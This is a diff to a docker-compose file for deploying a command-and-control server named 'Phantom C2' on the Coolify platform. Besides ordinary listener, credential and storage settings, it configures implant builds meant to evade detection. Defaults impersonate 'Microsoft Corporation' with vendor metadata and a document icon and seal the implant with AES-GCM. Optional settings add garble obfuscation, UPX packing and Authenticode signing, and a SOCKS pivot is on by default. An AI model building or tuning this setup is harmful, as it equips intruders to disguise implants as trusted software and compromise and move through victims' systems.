@@ -1,30 +1,82 @@
+# Phantom C2 - Coolify-ready deployment.
+#
+# Every knob is an environment variable WITH a safe default, so Coolify's
+# "Environment Variables" tab lists them all pre-filled: deploy the service,
+# open that tab, change only what you care about (ideally just PHANTOM_AUTH),
+# press Deploy. Nothing is required, no file edits, no volumes to wire up.
+#
+# Empty values mean "generate / auto-detect at boot":
+#   PHANTOM_AUTH      -> random admin:<20 chars>, persisted in the volume, printed in the logs
+#   PHANTOM_PSK       -> random 32-byte key, persisted in the volume
+#   PHANTOM_PUBLIC_URL-> derived per request from X-Forwarded-Host
+#
+# All variables are also documented in .env.example.
+
 services:
   phantom:
     build:
       context: .
       dockerfile: Dockerfile
+      args:
+        # optional hardening toolchain, needs a rebuild to take effect
+        INSTALL_GARBLE: ${INSTALL_GARBLE:-0}
+        INSTALL_UPX: ${INSTALL_UPX:-0}
     restart: unless-stopped
-    # The proxy reaches the container on port 80, so the Coolify domain is just
-    # https://your.domain - no port suffix needed.
+    # The proxy reaches the container internally, so the Coolify domain is just
+    # https://your.domain - no port suffix needed. Keep this fixed at 80 and set
+    # Coolify's "Ports Exposes" to 80 as well.
     expose:
       - "80"
     # ports:
-    #   - "8000:80"        # only needed for local testing, Coolify routes internally
+    #   - "8000:80"        # only for local testing, Coolify routes internally
     environment:
-      PHANTOM_PORT: "80"
-      # every value below is optional: empty = generated / auto-detected at boot
-      PHANTOM_AUTH: ${PHANTOM_AUTH:-}            # empty -> random password, persisted in /data
-      PHANTOM_PSK: ${PHANTOM_PSK:-}              # empty -> random key, persisted in /data
-      PHANTOM_PUBLIC_URL: ${PHANTOM_PUBLIC_URL:-}  # empty -> derived from the request host
+      # ---- listener -------------------------------------------------------
+      PHANTOM_HOST: ${PHANTOM_HOST:-0.0.0.0}          # must stay 0.0.0.0 behind the proxy
+      PHANTOM_PORT: ${PHANTOM_PORT:-80}               # proxy default, keep 80
+      PHANTOM_TLS: ${PHANTOM_TLS:-false}              # false: the proxy terminates TLS
+      PHANTOM_CERT: ${PHANTOM_CERT:-/app/server/certs/server.crt}
+      PHANTOM_KEY: ${PHANTOM_KEY:-/app/server/certs/server.key}
+      PHANTOM_LOG: ${PHANTOM_LOG:-info}               # debug | info | warning | error
+
+      # ---- credentials ----------------------------------------------------
+      PHANTOM_AUTH: ${PHANTOM_AUTH:-}                 # user:password, empty -> generated + persisted
+      PHANTOM_PSK: ${PHANTOM_PSK:-}                   # 64 hex chars, empty -> generated + persisted
+      PHANTOM_DEFAULT_PSK: ${PHANTOM_DEFAULT_PSK:-false}  # true -> use the shipped dev key
+
+      # ---- storage --------------------------------------------------------
+      PHANTOM_DATA: ${PHANTOM_DATA:-/data}            # must stay on the volume
+      PHANTOM_BUILDS: ${PHANTOM_BUILDS:-/data/builds}
+      PHANTOM_CONFIG: ${PHANTOM_CONFIG:-/app/server/config.yaml}
+
+      # ---- callback url / artifacts --------------------------------------
+      PHANTOM_PUBLIC_URL: ${PHANTOM_PUBLIC_URL:-}     # empty -> auto-detect from the request host
+      PHANTOM_GO: ${PHANTOM_GO:-go}
+      PHANTOM_VENDOR: ${PHANTOM_VENDOR:-Microsoft Corporation}
+      PHANTOM_ENCRYPT: ${PHANTOM_ENCRYPT:-true}       # AES-GCM seal the embedded implant
+      PHANTOM_METADATA: ${PHANTOM_METADATA:-true}     # vendor metadata + manifest + document icon
+      PHANTOM_GARBLE: ${PHANTOM_GARBLE:-false}        # needs INSTALL_GARBLE=1
+      PHANTOM_UPX: ${PHANTOM_UPX:-false}              # needs INSTALL_UPX=1
+      PHANTOM_SIGN_PFX: ${PHANTOM_SIGN_PFX:-}         # path to a .pfx to Authenticode sign
+      PHANTOM_SIGN_PASS: ${PHANTOM_SIGN_PASS:-}
+
+      # ---- SOCKS pivot ----------------------------------------------------
       PHANTOM_SOCKS: ${PHANTOM_SOCKS:-true}
+      PHANTOM_SOCKS_HOST: ${PHANTOM_SOCKS_HOST:-127.0.0.1}
+      PHANTOM_SOCKS_PORT: ${PHANTOM_SOCKS_PORT:-1080}
     volumes:
-      - phantom-data:/data
+      # named volume keeps the PSK, credentials, builds and blobs across redeploys
+      - phantom-data:${PHANTOM_DATA:-/data}
     healthcheck:
-      test: ["CMD-SHELL", "curl -fsS http://127.0.0.1:80/healthz || exit 1"]
+      test: ["CMD-SHELL", "curl -fsS http://127.0.0.1:${PHANTOM_PORT:-80}/healthz || exit 1"]
       interval: 30s
       timeout: 5s
       retries: 3
       start_period: 20s
+    logging:
+      driver: json-file
+      options:
+        max-size: "10m"
+        max-file: "3"
 
 volumes:
   phantom-data:
